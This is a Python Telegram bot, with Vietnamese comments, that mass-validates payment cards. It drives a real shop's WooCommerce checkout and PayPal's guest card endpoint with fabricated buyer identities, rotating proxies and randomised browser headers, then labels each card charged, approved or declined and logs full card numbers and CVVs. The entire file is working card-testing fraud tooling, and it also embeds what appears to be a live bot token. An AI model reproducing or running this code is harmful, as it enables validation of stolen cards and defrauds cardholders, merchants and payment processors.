import os
import re
import json
import random
import time
import logging
import asyncio 
import aiohttp # Thêm thư viện aiohttp
from datetime import datetime
from urllib.parse import urlencode, quote

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- Cấu hình Bot và Ứng dụng ---
# THAY THẾ TOKEN CỦA BẠN VÀO ĐÂY
TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ" 

# THAY THẾ ID NGƯỜI DÙNG ĐƯỢC PHÉP SỬ DỤNG BOT VÀO ĐÂY
AUTHORIZED_USERS = [5127429005] 

# Cấu hình file
PAYPAL_LOG_FILE = 'paypal.json'
PROXY_FILE = 'proxies.txt'

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


# --- HÀM LẤY THÔNG TIN BIN MỚI ---

async def make_request(session, url, method="GET", headers=None, data=None):
    """Hàm phụ trợ để thực hiện request bất đồng bộ."""
    try:
        async with session.request(method, url, headers=headers, json=data, timeout=10) as response:
            return response.status, await response.text()
    except asyncio.TimeoutError:
        return None, "Request Error: Timeout"
    except aiohttp.ClientError as e:
        return None, f"Request Error: {e}"

async def get_bin_info(card_number):
    """Lấy thông tin BIN từ API mới và trả về dưới dạng dictionary."""
    bin_num = card_number[:6]
    bin_url = f"https://bins.antipublic.cc/bins/{bin_num}"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
    
    async with aiohttp.ClientSession() as session:
        status, response_text = await make_request(session, bin_url, method="GET", headers=headers)

    if response_text and "Request Error" in response_text:
        return {'success': False, 'error': response_text}

    if status == 404:
        return {'success': False, 'error': 'BIN does not exist (404)'}
        
    try:
        bin_json = json.loads(response_text)
        
        if 'detail' in bin_json or bin_json.get('result') is False:
            return {'success': False, 'error': 'Invalid BIN (API rejected)'}

        # Trả về theo định dạng dictionary để tương thích với code cũ
        return {
            'success': True,
            'brand': bin_json.get('brand', 'N/A'),
            'type': bin_json.get('type', 'N/A'),
            'level': bin_json.get('level', 'N/A'),
            'bank': bin_json.get('bank', 'N/A'),
            'country': bin_json.get('country_name', 'N/A'),
            'country_code': bin_json.get('country_iso1', 'N/A')
        }
    except json.JSONDecodeError:
        return {'success': False, 'error': 'BIN data read error (JSONDecodeError)'}
    except Exception as e:
        return {'success': False, 'error': f'An unexpected error occurred ({e})'}


# --- Các hàm logic xử lý thẻ ---

def log_paypal_result(card, result, message, response_text='', bin_info=None):
    """Ghi lại kết quả vào file JSON."""
    log_entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'card': card,
        'result': result,
        'message': message,
        'response': response_text[:200], # Giới hạn độ dài response
        'bin_info': bin_info
    }
    
    existing_logs = []
    if os.path.exists(PAYPAL_LOG_FILE):
        try:
            with open(PAYPAL_LOG_FILE, 'r') as f:
                content = f.read()
                if content:
                    existing_logs = json.loads(content)
        except (json.JSONDecodeError, FileNotFoundError):
            existing_logs = []
    
    if not isinstance(existing_logs, list):
        existing_logs = []

    existing_logs.append(log_entry)
    
    with open(PAYPAL_LOG_FILE, 'w') as f:
        json.dump(existing_logs, f, indent=4)

def load_proxies():
    """Tải danh sách proxy từ file."""
    if not os.path.exists(PROXY_FILE):
        return []
    proxies = []
    with open(PROXY_FILE, 'r') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                try:
                    host, port = line.split(':')
                    proxies.append({'host': host, 'port': port})
                except ValueError:
                    continue
    return proxies

def get_random_proxy(proxies, used_proxies):
    """Lấy một proxy ngẫu nhiên chưa được sử dụng."""
    available_proxies = [p for p in proxies if f"{p['host']}:{p['port']}" not in used_proxies]
    if not available_proxies:
        return None
    return random.choice(available_proxies)

def execute_request_with_proxy(session, method, url, max_retries=3, **kwargs):
    """Thực thi một request sử dụng proxy với cơ chế thử lại."""
    proxies_list = load_proxies()
    if not proxies_list:
        try:
            response = session.request(method, url, timeout=15, **kwargs)
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException:
            return None

    attempt = 0
    used_proxies = set()
    
    while attempt <= max_retries:
        proxy_info = get_random_proxy(proxies_list, used_proxies)
        if not proxy_info:
            break

        proxy_str = f"{proxy_info['host']}:{proxy_info['port']}"
        used_proxies.add(proxy_str)
        
        proxy_dict = {
            'http': f'http://{proxy_str}',
            'https': f'http://{proxy_str}'
        }
        
        try:
            response = session.request(method, url, proxies=proxy_dict, timeout=(5, 10), **kwargs)
            if response.status_code < 400:
                return response
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError):
            attempt += 1
            continue

    try:
        kwargs.pop('proxies', None)
        response = session.request(method, url, timeout=15, **kwargs)
        return response
    except requests.exceptions.RequestException:
        return None

def generate_user_agent():
    """Tạo User-Agent ngẫu nhiên."""
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/121.0"
    ]
    return random.choice(agents)

def generate_ip_location():
    """Tạo thông tin vị trí ngẫu nhiên."""
    locations = [
        {
            'country': 'US', 'state': 'NY', 'city': 'New York', 'zip': '10001',
            'address': '123 Main St', 'phone_prefix': '212', 'language': 'en-US,en;q=0.9'
        },
        {
            'country': 'US', 'state': 'CA', 'city': 'Los Angeles', 'zip': '90001',
            'address': '456 Oak Ave', 'phone_prefix': '213', 'language': 'en-US,en;q=0.9'
        }
    ]
    return random.choice(locations)

def generate_phone_with_prefix(prefix):
    return f"{prefix}{random.randint(1000000, 9999999)}"

def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Smith", "Johnson", "Williams"]
    return random.choice(first_names), random.choice(last_names)

def generate_random_account():
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    name = ''.join(random.choice(chars) for _ in range(12))
    return f"{name}{random.randint(100, 999)}@gmail.com"

def generate_random_string(length):
    chars = 'abcdefghijklmnopqrstuvwxyz01234S56789'
    return ''.join(random.choice(chars) for _ in range(length))

def detect_card_type(card_number):
    if re.match(r'^4', card_number): return 'VISA'
    if re.match(r'^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)', card_number): return 'MASTERCARD'
    if re.match(r'^6011|65|64[4-9]', card_number): return 'DISCOVER'
    if re.match(r'^3[47]', card_number): return 'AMEX'
    if re.match(r'^220[0-4]', card_number): return 'MIR'
    return 'VISA'

def check_card_logic(card):
    """
    Hàm logic chính để kiểm tra thẻ.
    """
    match = re.match(r'^(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', card)
    if not match:
        return {'result': 'declined', 'error': 'Invalid card format! Use ccnum|mm|yyyy|cvv'}

    n, mm, yy, cvc = match.groups()
    mm = mm.zfill(2)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    
    card_info_str = f"{n}|{mm}|{yy}|{cvc}"
    
    # TÍCH HỢP HÀM GET BIN MỚI
    # Chạy hàm async từ một hàm sync bằng asyncio.run()
    bin_info = asyncio.run(get_bin_info(n))

    user_agent = generate_user_agent()
    first_name, last_name = generate_full_name()
    location = generate_ip_location()
    acc = generate_random_account()
    num = generate_phone_with_prefix(location['phone_prefix'])

    with requests.Session() as s:
        s.headers.update({'User-Agent': user_agent})

        # Bước 1: Thêm sản phẩm vào giỏ hàng
        add_to_cart_url = 'https://switchupcb.com/shop/i-buy/'
        cart_data = {'quantity': '1', 'add-to-cart': '4451'}
        cart_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Origin": "https://switchupcb.com", "Referer": "https://switchupcb.com/shop/i-buy/",
            "Accept-Language": location['language']
        }
        resp1 = execute_request_with_proxy(s, 'POST', add_to_cart_url, data=cart_data, headers=cart_headers)
        if not resp1:
            return {'result': 'declined', 'error': 'Failed to add to cart'}

        # Bước 2: Truy cập trang thanh toán để lấy nonces
        checkout_url = 'https://switchupcb.com/checkout/'
        checkout_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer": "https://switchupcb.com/cart/", "Accept-Language": location['language']
        }
        resp2 = execute_request_with_proxy(s, 'GET', checkout_url, headers=checkout_headers)
        if not resp2:
            return {'result': 'declined', 'error': 'Failed to access checkout page'}
        
        checkout_page_content = resp2.text
        sec_match = re.search(r'update_order_review_nonce":"(.*?)"', checkout_page_content)
        check_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', checkout_page_content)
        create_match = re.search(r'create_order.*?nonce":"(.*?)"', checkout_page_content)

        if not (sec_match and check_match and create_match):
            return {'result': 'declined', 'error': 'Failed to extract nonces'}
        
        sec, check, create = sec_match.group(1), check_match.group(1), create_match.group(1)
        
        # Bước 4: Tạo đơn hàng PayPal
        create_order_url = 'https://switchupcb.com/?wc-ajax=ppc-create-order'
        form_encoded_data = (f"billing_first_name={first_name}&billing_last_name={last_name}&billing_country={location['country']}&"
                             f"billing_address_1={quote(location['address'])}&billing_city={quote(location['city'])}&billing_state={location['state']}&"
                             f"billing_postcode={location['zip']}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&terms=on&terms-field=1&"
                             f"woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review")
        create_order_payload = {'nonce': create, 'payer': None, 'bn_code': 'Woo_PPCP', 'context': 'checkout', 'order_id': '0',
                                'payment_method': 'ppcp-gateway', 'funding_source': 'card', 'form_encoded': form_encoded_data,
                                'createaccount': False, 'save_payment_method': False}
        create_order_headers = {"Content-Type": "application/json", "Accept": "*/*", "Origin": "https://switchupcb.com",
                                "Referer": "https://switchupcb.com/checkout/"}
        
        resp3 = execute_request_with_proxy(s, 'POST', create_order_url, headers=create_order_headers, json=create_order_payload)
        if not resp3:
            return {'result': 'declined', 'error': 'Failed to create order'}
        
        try:
            paypal_token_id = resp3.json()['data']['id']
        except (json.JSONDecodeError, KeyError):
            log_paypal_result(card_info_str, 'declined', 'Failed to get PayPal token ID', resp3.text, bin_info)
            return {'result': 'declined', 'error': 'Failed to get PayPal token ID'}
        
        # Bước 6: Gửi yêu cầu thanh toán đến GraphQL của PayPal
        graphql_url = 'https://www.paypal.com/graphql?fetch_credit_form_submit'
        graphql_payload = {
            'query': 'mutation payWithCard($token: String!,$card: CardInput!,$phoneNumber: String,$firstName: String,$lastName: String,$shippingAddress: AddressInput,$billingAddress: AddressInput,$email: String,$currencyConversionType: CheckoutCurrencyConversionType,$installmentTerm: Int,$identityDocument: IdentityDocumentInput) {approveGuestPaymentWithCreditCard(token: $token,card: $card,phoneNumber: $phoneNumber,firstName: $firstName,lastName: $lastName,email: $email,shippingAddress: $shippingAddress,billingAddress: $billingAddress,currencyConversionType: $currencyConversionType,installmentTerm: $installmentTerm,identityDocument: $identityDocument) {flags {is3DSecureRequired}cart {intent cartId buyer {userId auth {accessToken}} returnUrl {href}} paymentContingencies {threeDomainSecure {status method redirectUrl {href} parameter}}}}',
            'variables': {
                'token': paypal_token_id, 'card': {'cardNumber': n, 'type': detect_card_type(n), 'expirationDate': f"{mm}/20{yy}",
                                                   'postalCode': location['zip'], 'securityCode': cvc},
                'firstName': first_name, 'lastName': last_name,
                'billingAddress': {'givenName': first_name, 'familyName': last_name, 'line1': location['address'], 'line2': None,
                                   'city': location['city'], 'state': location['state'], 'postalCode': location['zip'], 'country': location['country']},
                'email': acc, 'currencyConversionType': 'VENDOR'
            },
            'operationName': None
        }
        graphql_headers = {"Content-Type": "application/json", "Accept": "*/*", "Origin": "https://www.paypal.com",
                           "Referer": f"https://www.paypal.com/smart/card-fields?sessionID=uid_&buttonSessionID=uid_&locale.x=en_US&commit=true&env=production&token={paypal_token_id}",
                           "x-app-name": "hermione", "Accept-Language": location['language']}
        
        final_response = execute_request_with_proxy(s, 'POST', graphql_url, headers=graphql_headers, json=graphql_payload)

        # 7. Phân tích kết quả cuối cùng
        result, message = 'declined', 'Card declined'
        response_text = final_response.text if final_response else ""

        if final_response and final_response.status_code == 200:
            try:
                response_data = final_response.json()
                if response_data.get('data', {}).get('approveGuestPaymentWithCreditCard'):
                    result, message = 'charged', 'Payment successful'
                elif 'errors' in response_data:
                    for error in response_data['errors']:
                        error_code = next((field.get('code') for field in error.get('data', []) if field.get('code')), None)
                        if error_code:
                            error_map = {
                                'INVALID_SECURITY_CODE': ('approved', 'Invalid CVV'),
                                'SECURITY_CODE_MISMATCH': ('approved', 'Invalid CVV'),
                                'INSUFFICIENT_FUNDS': ('approved', 'Insufficient funds'),
                                'CARD_DECLINED': ('declined', 'Card declined'),
                                'CARD_EXPIRED': ('declined', 'Card expired'),
                            }
                            if error_code in error_map:
                                result, message = error_map[error_code]
                                break
                        else: # Fallback
                             error_msg = error.get('message', '').lower()
                             if 'invalid' in error_msg and 'cvv' in error_msg: result, message = 'approved', 'Invalid CVV'
                             elif 'insufficient' in error_msg: result, message = 'approved', 'Insufficient funds'
                             break
            except json.JSONDecodeError:
                 if '"status": "succeeded"' in response_text: result, message = 'charged', 'Payment successful'

        log_paypal_result(card_info_str, result, message, response_text, bin_info)

        return {
            'result': result, 'message': message, 'card': card_info_str,
            'gateway': "Paypal $0.01", 'author': "mnhattz", 'bin_info': bin_info
        }

# --- Các hàm chạy ngầm cho Bot ---

async def run_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """Hàm mục tiêu bất đồng bộ để xử lý một thẻ."""
    try:
        result_dict = await asyncio.to_thread(check_card_logic, card)
        message = format_result_message(result_dict)
    except Exception as e:
        logger.error(f"Lỗi khi check thẻ {card}: {e}")
        message = f"❌ Đã xảy ra lỗi khi xử lý thẻ: `{card}`"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def run_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """Hàm mục tiêu bất đồng bộ để xử lý nhiều thẻ."""
    chat_id = update.effective_chat.id
    total = len(cards)
    
    for i, card in enumerate(cards):
        card = card.strip()
        if not card:
            continue
            
        try:
            result_dict = await asyncio.to_thread(check_card_logic, card)
            message = format_result_message(result_dict, current=i + 1, total=total)
            await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Lỗi khi check hàng loạt thẻ {card}: {e}")
            message = f"❌ Lỗi xử lý thẻ `{card}`. Chuyển sang thẻ tiếp theo."
            await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
        await asyncio.sleep(1)

    await context.bot.send_message(chat_id=chat_id, text="✅ Hoàn tất quá trình kiểm tra hàng loạt!")

# --- Các hàm xử lý lệnh của Bot ---

def format_result_message(result_dict, current=None, total=None):
    """Định dạng thông báo kết quả để gửi cho người dùng."""
    result = result_dict.get('result', 'declined')
    status_emoji = "✅" if result in ['charged', 'approved'] else "❌"
    
    header = ""
    if current and total:
        header = f"*{current}/{total}*\n\n"
        
    card_info = f"💳 *Card:* `{result_dict.get('card', 'N/A')}`\n"
    status_info = f"{status_emoji} *Trạng thái:* `{result_dict.get('result', 'N/A').upper()}`\n"
    message_info = f"💬 *Thông báo:* `{result_dict.get('message', 'N/A')}`\n"
    gateway_info = f"GATEWAY: *{result_dict.get('gateway', 'N/A')}*\n"
    author_info = f"AUTHOR: *@{result_dict.get('author', 'N/A')}*\n\n"
    
    bin_info_dict = result_dict.get('bin_info', {})
    if bin_info_dict and bin_info_dict.get('success'):
        bin_details = (
            f"ℹ️ *Thông tin BIN:*\n"
            f"  - *Bank:* `{bin_info_dict.get('bank', 'N/A')}`\n"
            f"  - *Brand:* `{bin_info_dict.get('brand', 'N/A').upper()}`\n"
            f"  - *Type:* `{bin_info_dict.get('type', 'N/A').upper()}`\n"
            f"  - *Level:* `{bin_info_dict.get('level', 'N/A').upper()}`\n" # Thêm thông tin level
            f"  - *Country:* `{bin_info_dict.get('country', 'N/A')} ({bin_info_dict.get('country_code', 'N/A')})`\n"
        )
    else:
        error_msg = bin_info_dict.get('error', 'Không thể truy xuất')
        bin_details = f"ℹ️ *Thông tin BIN:* `{error_msg}`\n"

    return header + card_info + status_info + message_info + gateway_info + author_info + bin_details

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gửi tin nhắn chào mừng khi người dùng gõ /start."""
    user = update.effective_user
    await update.message.reply_html(
        f"Xin chào, {user.mention_html()}!\n\n"
        "Tôi là bot check thẻ Paypal.\n"
        "Sử dụng các lệnh sau:\n"
        "`/cs card|mm|yyyy|cvv` - Để check một thẻ.\n"
        "`/mass` - Gửi kèm file .txt để check hàng loạt.\n\n"
        "Bot được tạo bởi @mnhattz."
    )

async def cs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /cs để check một thẻ."""
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("Bạn không được phép sử dụng lệnh này.")
        return

    if not context.args:
        await update.message.reply_text("Vui lòng nhập thẻ theo định dạng:\n`/cs 427367...|MM|YYYY|CVV`", parse_mode='Markdown')
        return

    card = context.args[0]
    await update.message.reply_text(f"⏳ Đã nhận lệnh, đang kiểm tra thẻ `{card}`...", parse_mode='Markdown')
    
    asyncio.create_task(run_single_check(update, context, card))

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /mass để check thẻ hàng loạt từ file."""
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("Bạn không được phép sử dụng lệnh này.")
        return

    if not update.message.document:
        await update.message.reply_text("Vui lòng gửi kèm một file .txt chứa danh sách thẻ với lệnh `/mass`.")
        return

    document = update.message.document
    if document.mime_type != 'text/plain':
        await update.message.reply_text("Định dạng file không hợp lệ. Vui lòng chỉ gửi file .txt.")
        return

    await update.message.reply_text("⏳ Đang tải file và chuẩn bị kiểm tra...")

    try:
        file = await context.bot.get_file(document.file_id)
        file_content_bytes = await file.download_as_bytearray()
        file_content = file_content_bytes.decode('utf-8')
        cards = file_content.splitlines()

        if not cards:
            await update.message.reply_text("File rỗng, không có thẻ nào để kiểm tra.")
            return

        await update.message.reply_text(f"✅ Đã nhận được {len(cards)} thẻ. Bắt đầu quá trình kiểm tra hàng loạt (kết quả sẽ được gửi riêng cho từng thẻ)...")
        
        asyncio.create_task(run_mass_check(update, context, cards))

    except Exception as e:
        logger.error(f"Lỗi khi xử lý file: {e}")
        await update.message.reply_text("Đã có lỗi xảy ra khi đọc file.")


def main():
    """Khởi động bot."""
    application = Application.builder().token(TOKEN).build()

    # Thêm các handler cho lệnh
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("mass", mass_command))

    # Bắt đầu chạy bot
    application.run_polling()

if __name__ == '__main__':
    main()
